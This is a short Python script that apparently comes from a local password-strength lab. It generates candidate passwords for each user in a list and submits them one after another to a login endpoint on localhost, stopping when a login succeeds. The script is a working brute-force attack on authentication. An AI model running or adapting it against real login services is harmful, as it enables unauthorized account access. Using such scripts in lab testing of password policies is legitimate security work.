from util import users_list, generate_sequences
from passwords import *
import requests, time, yaml

with open("config.yaml", "r") as f:
    config = yaml.safe_load(f)
PASS_LEVEL = config["config"]["pass_level"]

LOGIN_URL = "http://127.0.0.1:5000/login"

USERS = users_list(PASS_LEVEL)

PASS_FILE = f"passwords/{PASS_LEVEL}pass.txt"


for user in USERS:
    generate_sequences(PASS_LEVEL, PASS_FILE, user, 5)
    with open(PASS_FILE, "r") as f:
        for attempt_num, password in enumerate(f, start=1):
            password = password.strip()

            response = requests.post(
                LOGIN_URL,
                json={
                    "username": user,
                    "password": password
                }
            )

            if response.status_code == 200:
                break
            
            if attempt_num % 500000 == 0:
                print("next user")
                pass

            time.sleep(0.01)